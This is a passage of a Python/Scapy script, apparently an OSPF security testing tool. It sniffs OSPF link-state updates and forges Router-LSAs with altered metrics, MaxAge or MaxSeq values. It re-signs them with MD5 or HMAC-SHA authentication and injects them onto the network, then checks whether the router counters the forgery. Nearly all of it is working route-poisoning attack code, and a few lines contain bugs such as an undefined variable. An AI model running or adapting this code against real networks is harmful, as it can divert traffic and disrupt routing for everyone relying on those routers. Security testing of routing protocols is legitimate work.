			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(12))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha384()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha384()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha512" :	
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(16))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha512()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha512()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)	
		raw_input("Press Enter to continue...")
		main()
		Attacks()	
	def Two_MaxAge_attack(): #Done
		print("")
		load_contrib('ospf')
		print("Intercepting OSPF's LSU. Please wait, this may take up to 30 minutes")
		
		def stopfilter(x):
			if x[OSPF_Hdr].type == 4 and "OSPF_Router_LSA" in x : #to select only packet with Router_LSA not Network-LSA
				return True
			else:
				return False
		pkts_atk=sniff(filter="ip proto 0x59", stop_filter=stopfilter) #sniff for LSUpdate
		
		def chkvuln(keep_seq):
			pkts_chk=sniff(filter="ip proto 0x59", timeout = 20)
			global sta2
			FFb=False
			for index in range(len(pkts_chk)): 
				try: 
					if pkts_chk[index][OSPF_Router_LSA].seq == keep_seq+1 or pkts_chk[index][OSPF_LSA_Hdr].seq == keepseq+1:
						sta2 = "     Fightback engaged, not vulnerable for MaxAge Attack"
						print "Fightback engaged, not vulnerable for MaxAge Attack"
						FFb=True
						break;
				except IndexError:
					FFb=False
					continue
			if FFb != True:	
				sta2 = "     No Fightback engaged, not vulnerable for MaxAge attack"
				print('No fightback engaged, vulnerable for MaxAge attack')
			
		
		lenpkts = len(pkts_atk)-1 #to select the last packet captured from sniffed
		if get_authtype(pkts_atk[lenpkts]) == "0_no" :
			#change metric and send out, reload checksum
			#print("degug_0")
			pkts_atk[lenpkts][OSPF_Router_LSA].age = 3600
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 1
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			sendp(pkts_atk[lenpkts], verbose=1)
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_atk[lenpkts], verbose=1)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)
			##Check by receiveack within 10 sec, and check with same ack and Packetchksum

		elif get_authtype(pkts_atk[lenpkts]) == "1_plain" :
			#change metric and send out, reload checksum
			#print("debug_1")
			pkts_atk[lenpkts][OSPF_Router_LSA].age = 3600
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_atk[lenpkts], verbose=1)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_md" :
			#cut auth data, gen auth seq data, no need for checsum <<<< but what if LSA contain only network-lsa?? check LSTYPE first!!!
			#print("debug_2md")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA].age = 3600
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #cut out hash
			#print key_padd
			ospf_header_combine = ospf_header_cuthash + key_padd
			genhash = hashlib.md5()
			genhash.update(ospf_header_combine)
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash.digest() #obtain the Layer2,3 header
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha1" :	
			#print("debug_2sha1")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA].age = 3600
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(5))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha1()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha1()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			chkvuln(keep_seq)
		
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha256" :	
			#print("debug_2sha256")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA].age = 3600
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(8))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha256()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha256()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha384" :	
			#print("2sha384activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA].age = 3600
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(12))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha384()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha384()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha512" :	
			#print("debug_2sha512")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA].age = 3600
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(16))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha512()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha512()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			chkvuln(keep_seq)	
		time.sleep(5)
		main()
		Attacks()	
	def Three_MaxSeq_attack(): #Done 
		print("")
		load_contrib('ospf')
		print("Intercepting OSPF's LSU. Please wait, this may take up to 30 minutes")
		
		def stopfilter(x):
			if x[OSPF_Hdr].type == 4 and "OSPF_Router_LSA" in x:
				return True
			else:
				return False
		pkts_atk=sniff(filter="ip proto 0x59", stop_filter=stopfilter) 
		
		def chkvuln(R_id):
			pkts_chk=sniff(filter="ip proto 0x59", timeout = 20)
			FFb_1=False
			FFb_2=False
			for index in range(len(pkts_chk)): 
				try: 
					if pkts_chk[index][OSPF_Router_LSA].seq == 2147483647 and pkts_chk[index][OSPF_Router_LSA].age == 3600:
						FFb_1=True
						break;
				except IndexError:
					FFb_1=False
					continue
			for index in range(len(pkts_chk)): 
				try: 
					if pkts_chk[index][OSPF_Router_LSA].seq == 2147483649 and pkts_chk[index][OSPF_Router_LSA].id == R_id:
						FFb_2=True
						break;
				except IndexError:
					FFb_2=False
					continue
					
			if FFb_1 == True and FFb_2 == True:	
				sta3 = "     Router counter the attack in a proper way (issue maxage before fightback), not vulnerable for MaxSeq Attack"
				print "Router counter the attack in a proper way (issue maxage before fightback), not vulnerable for MaxSeq Attack"
			elif FFb_1 == True and FFb_2 == False:
				sta3 = "     Router issue maxage but no fightback with first sequence number found, vulnerable for MaxSeq Attack"
				print "Router issue maxage but no fightback with first sequence number found, vulnerable for MaxSeq Attack"
			else:
				sta3 = "     No fightback engaged, vulnerable for MaxSeq attack"
				print "No fightback engaged, vulnerable for MaxSeq attack"		
				
			print FFb_1
			print FFb_2
			
		
		lenpkts = len(pkts_atk)-1 #to select the last packet captured from sniffed
		if get_authtype(pkts_atk[lenpkts]) == "0_no" :
			#change metric and send out, reload checksum
			#print("debug_0")
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq = 2147483647 
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			R_id = pkts_atk[lenpkts][OSPF_Router_LSA].id
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_atk[lenpkts], verbose=1)
			print("Checking for Vulnerability")
			chkvuln(R_id)
			##Check by receiveack within 10 sec, and check with same ack and Packetchksum

		elif get_authtype(pkts_atk[lenpkts]) == "1_plain" :
			#change metric and send out, reload checksum
			#print("debug_1")
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq = 2147483647
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_atk[lenpkts], verbose=1)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_md" :
			#cut auth data, gen auth seq data, no need for checsum <<<< but what if LSA contain only network-lsa?? check LSTYPE first!!!
			#print("debug_2md")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq = 2147483647
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #cut out hash
			#print key_padd
			ospf_header_combine = ospf_header_cuthash + key_padd
			genhash = hashlib.md5()
			genhash.update(ospf_header_combine)
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash.digest() #obtain the Layer2,3 header
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			print("Checking for Vulnerability")
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha1" :	
			#print("debug_2sha1")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq = 2147483647
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(5))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha1()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha1()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			chkvuln(keep_seq)
		
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha256" :	
			#print("2sha256activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq = 2147483647
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(8))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha256()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha256()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha384" :	
			#print("2sha384activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq = 2147483647
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(12))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha384()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha384()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
			chkvuln(keep_seq)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha512" :	
			#print("debug_2sha512")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			pkts_atk[lenpkts][OSPF_Router_LSA][OSPF_Link].metric += 12
			pkts_atk[lenpkts][OSPF_Router_LSA].seq = 2147483647
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			keep_seq = pkts_atk[lenpkts][OSPF_Router_LSA].seq
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(16))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha512()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha512()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			print("Checksum = " + hex(pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum))
			print("Sequence = " + hex(pkts_atk[lenpkts][OSPF_Router_LSA].seq))
			time.sleep(10)
			sendp(pkts_new)
